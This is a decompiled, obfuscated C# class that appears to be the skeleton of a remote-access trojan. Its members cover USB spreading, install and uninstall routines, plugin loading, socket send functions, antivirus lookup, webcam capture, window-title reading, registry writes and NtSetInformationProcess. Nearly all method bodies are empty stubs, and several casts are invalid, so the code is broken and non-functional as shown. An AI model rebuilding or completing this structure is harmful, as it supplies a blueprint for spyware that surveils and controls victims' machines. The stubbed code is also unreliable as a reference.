using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using hsnLdkMtt9W3LiVovy;
using rqgpMOog6QbCIdVyvr;

namespace j;

[StandardModule]
internal sealed class OK
{
	private static object b;

	public static bool BD;

	public static object C;

	public static bool Cn;

	public static object DR;

	public static object EXE;

	public static object F;

	public static object FS;

	public static object H;

	public static bool Idr;

	public static bool Anti_CH;

	public static bool IsF;

	public static bool USB_SP;

	public static bool Isu;

	public static object kq;

	private static object lastcap;

	public static object LO;

	private static object MeM;

	public static object MT;

	public static object P;

	public static object PLG;

	public static object RG;

	public static object sf;

	public static object VN;

	public static object VR;

	public static object Y;

	private static object gWXLUHkNnr0Y9Lc30E;

	static OK()
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		dlLFmbU8fZgjw22Fes.l42RINlY5i();
		dlLFmbU8fZgjw22Fes.fgRRjcGSFF();
		vbGVAY3iHv2WcJ8Ch3.rJwwSXLzyDMrv();
		b = new byte[5121];
		BD = XGmPGQfoxJeWhcXyx1(e9wagdN078mVEo8Ie4(424));
		C = null;
		Cn = false;
		DR = e9wagdN078mVEo8Ie4(436);
		EXE = e9wagdN078mVEo8Ie4(454);
		F = (object)new Computer();
		H = e9wagdN078mVEo8Ie4(478);
		Idr = XGmPGQfoxJeWhcXyx1(e9wagdN078mVEo8Ie4(424));
		Anti_CH = XGmPGQfoxJeWhcXyx1(e9wagdN078mVEo8Ie4(536));
		IsF = Conversions.ToBoolean((string)e9wagdN078mVEo8Ie4(536));
		USB_SP = XGmPGQfoxJeWhcXyx1(dlLFmbU8fZgjw22Fes.U43RJ2rilf(536));
		Isu = XGmPGQfoxJeWhcXyx1(dlLFmbU8fZgjw22Fes.U43RJ2rilf(424));
		kq = null;
		lastcap = "";
		LO = new FileInfo((string)rD9FX8w1Gqim3iGhrs(DyLCDPTPQtiaLmYWLW()));
		MeM = new MemoryStream();
		MT = null;
		P = e9wagdN078mVEo8Ie4(550);
		PLG = null;
		RG = e9wagdN078mVEo8Ie4(564);
		sf = e9wagdN078mVEo8Ie4(632);
		VN = e9wagdN078mVEo8Ie4(726);
		VR = e9wagdN078mVEo8Ie4(754);
		Y = dlLFmbU8fZgjw22Fes.U43RJ2rilf(766);
	}

	[CompilerGenerated]
	[DebuggerStepThrough]
	private static void _Lambda__1(object a0)
	{
	}

	[CompilerGenerated]
	[DebuggerStepThrough]
	private static void _Lambda__2(object a0, object a1)
	{
	}

	public static string ACT()
	{
		return null;
	}

	public static string BS(ref byte[] B)
	{
		return null;
	}

	public static bool Cam()
	{
		return true;
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	private static bool CompDir(object F1, object F2)
	{
		return true;
	}

	public static bool connect()
	{
		return true;
	}

	public static string DEB(ref string s)
	{
		return null;
	}

	public static void DLV(object n)
	{
	}

	public static void ED()
	{
	}

	public static string ENB(ref string s)
	{
		return null;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	public static string GetAntiVirus()
	{
		return null;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public static object GTV(object n, object ret)
	{
		return null;
	}

	public static string HWD()
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Ind(object b)
	{
	}

	public static string inf()
	{
		return null;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void INS()
	{
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void ko()
	{
	}

	public static string md5(object B)
	{
		return null;
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static object Plugin(object b, object c)
	{
		return null;
	}

	public static void pr(int i)
	{
	}

	public static void RC()
	{
	}

	public static byte[] SB(ref string S)
	{
		return null;
	}

	public static bool Send(object S)
	{
		return true;
	}

	public static bool Sendb(object b)
	{
		return true;
	}

	public static bool STV(object n, object t, RegistryValueKind typ)
	{
		return true;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void UNS()
	{
	}

	public static byte[] ZIP(object B)
	{
		return null;
	}

	internal static object e9wagdN078mVEo8Ie4(int int_0)
	{
		return null;
	}

	internal static bool XGmPGQfoxJeWhcXyx1(object object_0)
	{
		return true;
	}

	internal static object DyLCDPTPQtiaLmYWLW()
	{
		return null;
	}

	internal static object rD9FX8w1Gqim3iGhrs(object object_0)
	{
		return null;
	}

	internal static bool WP33oiCC2bhLuSrJ4h()
	{
		return true;
	}

	internal static OK YJKRLVeKoVs3R7VNhk()
	{
		return null;
	}

	internal static void UeipNqVCwRLeTy1k32()
	{
	}

	internal static void M5f4v9mCUZqFO2xPEE(object object_0)
	{
	}

	internal static void nATqNc8yOjZbv2urX0()
	{
	}

	internal static bool bJO1L06N3Y1Caj44Yg(IntPtr intptr_0, IntPtr intptr_1)
	{
		return true;
	}

	internal static long AXJhIdWpwCFepHSMnY(IntPtr intptr_0)
	{
		return 0L;
	}

	internal static object Qi7RFX3JbtdcbKKyyC(int int_0)
	{
		return null;
	}

	internal static int xNbQJdcdaHVwNIDoOf(object object_0)
	{
		return 0;
	}

	internal static void U2DXXbuCnVaUJxXfDn(object object_0)
	{
	}

	internal static void eZVg6ALkEkkHeUYZdA()
	{
	}

	internal static object pVLcGbnSA7TMWTiOyi()
	{
		return null;
	}

	internal static object ffNUwqq23aXDd8VZkk(object object_0)
	{
		return null;
	}

	internal static int J6vSWhpn7n0AScDVlU(object object_0, object object_1, bool bool_0)
	{
		return 0;
	}

	internal static object st5eOt2UDEdfMZUF8q(object object_0)
	{
		return null;
	}

	internal static object htxkVtzMXRHLUSuGcJ(object object_0)
	{
		return null;
	}

	internal static object znb9PddhkEgmOBtJPe8(object object_0)
	{
		return null;
	}

	internal static void Ur36PNddWAOfrny4Oca(object object_0)
	{
	}

	internal static void Wyf2JSdxDTSqsVGBUCd(object object_0)
	{
	}

	internal static void i7vKYLdZSHYITRdbToC(object object_0)
	{
	}

	internal static void IwGV1IdD4oST1Ql4jn1(object object_0, int int_0)
	{
	}

	internal static object oZ3UQhdFlSt7kyfstUN(object object_0)
	{
		return null;
	}

	internal static void KCP3Q6db7VtNLNllcPd(object object_0, int int_0)
	{
	}

	internal static void kV4J9wdgVyrWI0LsjRb(object object_0, object object_1, int int_0)
	{
	}

	internal static bool qW0FbwdBZFejRGQl9QP(object object_0, object object_1, bool bool_0)
	{
		return true;
	}

	internal static object MiJgxqdjimsNfxmwHja(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static object W8ZC7md5tSLK0ekgBMN(object object_0, object object_1)
	{
		return null;
	}

	internal static object BBnR8FdSLkxm74rLLWk(object object_0)
	{
		return null;
	}

	internal static object N00P3ddycyNIZFnNQZc(object object_0)
	{
		return null;
	}

	internal static object rGDJhvdt6IrdpGvUG7V(bool bool_0)
	{
		return null;
	}

	internal static object qfEKBudX4nPfLnpEmq8(object object_0)
	{
		return null;
	}

	internal static bool CvinHldiQidrk8fQY1X(object object_0)
	{
		return true;
	}

	internal static void LbIuDld0x2GqWlEnWXZ(object object_0)
	{
	}

	internal static object fHIwGEdPWJLgTwqINVc(object object_0)
	{
		return null;
	}

	internal static object ecfhfJdEVS73Ft7TxgL(object object_0)
	{
		return null;
	}

	internal static object YsxODvdIKgb3F9nZEAB(object object_0, object object_1)
	{
		return null;
	}

	internal static object tOCDaFdMunsLMqYRMLj(object object_0, object object_1, bool bool_0)
	{
		return null;
	}

	internal static void dkVJn3daftqbnIqEsTc(object object_0, object object_1)
	{
	}

	internal static void PZ5CgbdY39wslSWvd4a(int i)
	{
	}

	internal static object LhyuhJdvmtgYip7I1Th(object object_0)
	{
		return null;
	}

	internal static object d4MatidGvaMJoou8aLB(object object_0, object object_1)
	{
		return null;
	}

	internal static object PAecVVdJgiN9g3hmRsq(object object_0, Type type_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		return null;
	}

	internal static object zXVMsqdHuE6iCXwt6rq(object object_0)
	{
		return null;
	}

	internal static object HHclSpdORYMLvL5CFo9(object object_0)
	{
		return null;
	}

	internal static bool VMvYGCdApac6UhTRGWH(object object_0)
	{
		return true;
	}

	internal static void Xb4RCsdo616tvZUIcVT(object object_0)
	{
	}

	internal static object euIPfcdsXZebn9K8d2o(object object_0)
	{
		return null;
	}

	internal static object UVVeG5dlhHLiaBcoAIG(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static object g5cYbSd9VN4YwUuEeda(int int_0)
	{
		return null;
	}

	internal static object t96CcXdKWUtKP1MigEf(object object_0, object object_1, int int_0, CompareMethod compareMethod_0)
	{
		return null;
	}

	internal static bool xRmGNwdR6WQiwd5JgjM(object object_0, object object_1, RegistryValueKind typ)
	{
		return true;
	}

	internal static object LMPkBYd7DfLCJeswSgb(object object_0, object object_1, object object_2, object object_3)
	{
		return null;
	}

	internal static object mwuuW0d1RxSOfIYKP8M(object object_0, object object_1)
	{
		return null;
	}

	internal static void eI6YDKdQHiJLNAdabVu(object object_0)
	{
	}

	internal static char eLjV1Pdrg0qrYXUT9VY(object object_0, int int_0)
	{
		return '\0';
	}

	internal static void tAnpqid4BETQcqSX8K0(object object_0, object object_1, int int_0, int int_1)
	{
	}

	internal static object xM9Ux7dUTj6wccV9bWY(object object_0)
	{
		return null;
	}

	internal static object JGWAdAdkdE5g8fWrygi(object object_0)
	{
		return null;
	}

	internal static object EXy6IedC1jccGbPnSns()
	{
		return null;
	}

	internal static object toaCSDdeL7wtgprfSTE(object object_0)
	{
		return null;
	}

	internal static object jevlNPdNg5QnM8VETFW(object object_0)
	{
		return null;
	}

	internal static object XIKhBtdfScffET5bK6P(int int_0)
	{
		return null;
	}

	internal static void IEagkcdTsgycExrXvNQ(object object_0, Type type_0, object object_1, object object_2, object object_3, object object_4)
	{
	}

	internal static object Wa6431dw0vVOLpnmx0V(object object_0, Type type_0, object object_1, object object_2, object object_3, object object_4, object object_5, bool bool_0)
	{
		return null;
	}

	internal static object HfdSAfdV4qV6d1ADV5s(object object_0, object object_1, bool bool_0)
	{
		return null;
	}

	internal static object ojDUuXdmlTFEoyxapne(object object_0, object object_1)
	{
		return null;
	}

	internal static bool sxWJedd8a2vhcWdDjYN(object object_0)
	{
		return true;
	}

	internal static object GSnDdAd6iX9kYN8xEGS(object object_0, object object_1)
	{
		return null;
	}

	internal static object JBx4VBdWQ8mxDTfWyye()
	{
		return null;
	}

	internal static Rectangle OQDQLZd3ML9PEORqbJe(object object_0)
	{
		return (Rectangle)(object)null;
	}

	internal static object EhrN28dc96NGsNFOjcX(object object_0)
	{
		return null;
	}

	internal static int QY2Nt8du7dQVbY5Hwgp(object object_0)
	{
		return 0;
	}

	internal static int v25XNudLkGYVsoa0t0X(object object_0)
	{
		return 0;
	}

	internal static void DvSH2WdnckpeCXF2i4v(object object_0, int int_0, int int_1, int int_2, int int_3, Size size_0, CopyPixelOperation copyPixelOperation_0)
	{
	}

	internal static Point XP0M3ndqnbSaY8ctECq()
	{
		return (Point)(object)null;
	}

	internal static void IrsK6DdpQ1gbIghVAMJ(object object_0, object object_1, Rectangle rectangle_0)
	{
	}

	internal static void m66anqd2swKrGXryRKM(object object_0)
	{
	}

	internal static int o43xAjdzZVSWXPK0gop(object object_0)
	{
		return 0;
	}

	internal static object iI6FFjxhYfQToaUgegW(object object_0)
	{
		return null;
	}

	internal static long IeWsgGxd4x4qSsjOWdS(object object_0)
	{
		return 0L;
	}

	internal static void Eo1DPQxxabw0sjH5OXw(object object_0, byte byte_0)
	{
	}

	internal static bool KMjnOvxZLqlFwWfomWj(object object_0)
	{
		return true;
	}

	internal static void wIowcyxD3mcTBGLrtpt(object object_0)
	{
	}

	internal static void kwrtrNxFAvnZe7Y1d5c()
	{
	}

	internal static object jgEiJ5xbB21mntqSOBc(object object_0)
	{
		return null;
	}

	internal static object YrdiHaxg0sppdTGQEKX(object object_0)
	{
		return null;
	}

	internal static void UBfsxdxBLXCIuNgNVQD(int int_0)
	{
	}

	internal static void PJlnLNxjsafDsbUGXNk(object object_0, object object_1)
	{
	}

	internal static object Sb7KVHx5eTQbl8Ioh9I(object object_0, object object_1)
	{
		return null;
	}

	internal static Type AX0cOmxSJOgxGn5cQnV(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return null;
	}

	internal static object GbnY9exyIvGXAKTN26h(object object_0, Type type_0)
	{
		return null;
	}

	internal static object WuNIHtxth6KOeaP3sQB()
	{
		return null;
	}

	internal static object IKSecrxXXH43rSuXFlx()
	{
		return null;
	}

	internal static object pVADOLxiZdwu2Qp2GnM()
	{
		return null;
	}

	internal static DateTime KlhI5Ox0OZHhwD9YaoI(object object_0)
	{
		return (DateTime)(object)null;
	}

	internal static object CsyiibxPg1GtKUfMynp(object object_0)
	{
		return null;
	}

	internal static object WEGVg1xEDkQZ0mOELjo(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static object bHJxY1xIvmMw0HytniV()
	{
		return null;
	}

	internal static object gv6XJZxMPBKkWkgihdb(object object_0)
	{
		return null;
	}

	internal static bool KUXkHmxaq2ABMZVkZKR(object object_0, object object_1)
	{
		return true;
	}

	internal static object KaHcvOxYkvSd4qilufF()
	{
		return null;
	}

	internal static object Mf2LubxvM7VOvYIPARW(object object_0)
	{
		return null;
	}

	internal static bool axAiX3xGEcZ46DjtrcK(object object_0, object object_1)
	{
		return true;
	}

	internal static object ySxcbqxJuDTomwCr6An(object object_0)
	{
		return null;
	}

	internal static bool bBpMV3xHHLYmKnLxaR7(object object_0)
	{
		return true;
	}

	internal static void afsvvrxOgxMKtZZJYbv(object object_0)
	{
	}

	internal static object g5pyMVxAWQbFe2SdfOx(object object_0)
	{
		return null;
	}

	internal static void c9fZQ0xoOkghFEVaZjZ(object object_0, object object_1, int int_0, int int_1)
	{
	}

	internal static void bkSpUYxsq9Fa1uOTfXU(object object_0)
	{
	}

	internal static object CiXHBMxlDZkQA99hhej(object object_0)
	{
		return null;
	}

	internal static void Oi4FRfx938AuPpD8RLp(object object_0, object object_1, object object_2)
	{
	}

	internal static object E0Zx78xKBlRjcDV98sZ(Environment.SpecialFolder specialFolder_0)
	{
		return null;
	}

	internal static void SSqtODxROAvnkpCZBjZ(object object_0, object object_1, bool bool_0)
	{
	}

	internal static void CVJ7Hpx7VIvLy568kKL()
	{
	}

	internal static object lmD0IDx1Vx0LwmCx3gf()
	{
		return null;
	}

	internal static object Ibssr1xQcoFt6ZwxBub(object object_0)
	{
		return null;
	}

	internal static object SaiGKSxrTEdvsQRrTOc(object object_0)
	{
		return null;
	}

	internal static object wTbokYx4r0AUD20SNXO()
	{
		return null;
	}

	internal static void EIA4YUxUa0o5yLdiaE9(object object_0, object object_1)
	{
	}

	internal static object go7Xkexka7yx3uFKtZc()
	{
		return null;
	}

	internal static void b1vYXaxCf5Txry9DvgQ(object object_0)
	{
	}

	internal static void bNHdGQxeGxTdfOb24YM(object object_0)
	{
	}

	internal static void Xy5EpaxNuKgM8hlqbOs()
	{
	}

	internal static void xgSDcmxfjvnk8eYnQDI(object object_0, IntPtr intptr_0)
	{
	}

	internal static object YoC6QnxTRykLIjIkknr()
	{
		return null;
	}

	internal static bool o4Ec02xwyr5CAX5aPVQ(object object_0, object object_1, bool bool_0)
	{
		return true;
	}

	internal static object zgqtpgxVBMi06ssItx2(object object_0)
	{
		return null;
	}

	internal static object iOur5LxmiWBiTFkbQm1(object object_0)
	{
		return null;
	}

	internal static object tSp2bCx8mPAe3Qb2Mn0(object object_0)
	{
		return null;
	}

	internal static object Mdmysgx6472sjdRRH42(object object_0)
	{
		return null;
	}

	internal static object OFcQWFxWqnKkxcQLMXL(object object_0, object object_1)
	{
		return null;
	}

	internal static object X73mxwx3L7RBvhng6oR()
	{
		return null;
	}

	internal static IntPtr gSUQnlxc4xbZeNiunub(object object_0)
	{
		return (IntPtr)(object)null;
	}

	internal static int oSlAOPxuXMUsWFqMT33(object object_0)
	{
		return 0;
	}

	internal static bool k6QH69xL2vmiRVu7Z1y(object object_0, int int_0, SelectMode selectMode_0)
	{
		return true;
	}

	internal static object xbAgy7xnXBwXWlhVikW(object object_0)
	{
		return null;
	}

	internal static int IeO5Dexq8ALvPAtWVvy(object object_0)
	{
		return 0;
	}

	internal static long RqMsRIxpm5LqF3lvPHU(object object_0)
	{
		return 0L;
	}

	internal static char ibA5mgx2yYpf1Aal3tI(int int_0)
	{
		return '\0';
	}

	internal static int z3yvaHxzQfdDWL6Iete(object object_0, object object_1, int int_0, int int_1, SocketFlags socketFlags_0)
	{
		return 0;
	}

	internal static void eL0FVDZhVQG4oUs2C1k(object object_0, object object_1)
	{
	}

	internal static bool MM6QbmZdx0AvIGIec6Z(object object_0, int int_0)
	{
		return true;
	}

	internal static bool FRMUZuZxDrHMpkT1fgF()
	{
		return true;
	}

	internal static object eyV3YaZZuHQ7JB5yugL(object object_0, object object_1)
	{
		return null;
	}

	internal static int VSp8wTZD7Sm2FTNVWAI(object object_0, object object_1, int int_0, int int_1, SocketFlags socketFlags_0)
	{
		return 0;
	}

	internal static object edUxxAZFmu8peqZ6v5b(object object_0, object object_1)
	{
		return null;
	}

	internal static void d6hyumZbSddCRnEeYA4(object object_0, object object_1, object object_2, RegistryValueKind registryValueKind_0)
	{
	}

	internal static object kraNCQZgLqSUbF1D8Fy(object object_0)
	{
		return null;
	}

	internal static void yse7sJZBM67qBAfEckt(object object_0, object object_1, bool bool_0)
	{
	}

	internal static int wSJSopZj7dxf7YudEuO(object object_0, AppWinStyle appWinStyle_0, bool bool_0, int int_0)
	{
		return 0;
	}

	internal static void ojOQsRZ58uHfsLtEFqN(object object_0, object object_1, bool bool_0)
	{
	}

	internal static int FtNujrZSmD2pXDqLCrr(object object_0, object object_1, int int_0, int int_1)
	{
		return 0;
	}

	internal static int t98phgZyJSHIaSCv0MU(object object_0, int int_0)
	{
		return 0;
	}

	internal static void KLVCn7Ztk1VGJryA4Qq(object object_0, long long_0)
	{
	}
}
